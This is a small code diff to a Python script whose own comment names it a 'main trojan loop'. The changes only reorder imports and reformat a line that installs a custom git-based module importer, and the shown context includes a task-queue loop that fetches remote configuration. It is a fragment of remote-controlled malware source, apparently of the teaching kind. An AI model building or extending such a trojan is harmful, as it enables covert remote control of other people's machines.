@@ -1,12 +1,12 @@
 #!/usr/bin/env python3
 
+import os, sys
 import imp
 import time
 import json
 import queue
 import base64
 import random
-import os, sys
 import getpass
 import threading
 
@@ -98,7 +98,7 @@ def run_module(module):
 
 
 # main trojan loop
-sys.meta_path = [GitImport()]
+sys.meta_path = [ GitImport() ]
 while True:
     if task_queue.empty():
         conf = get_config()
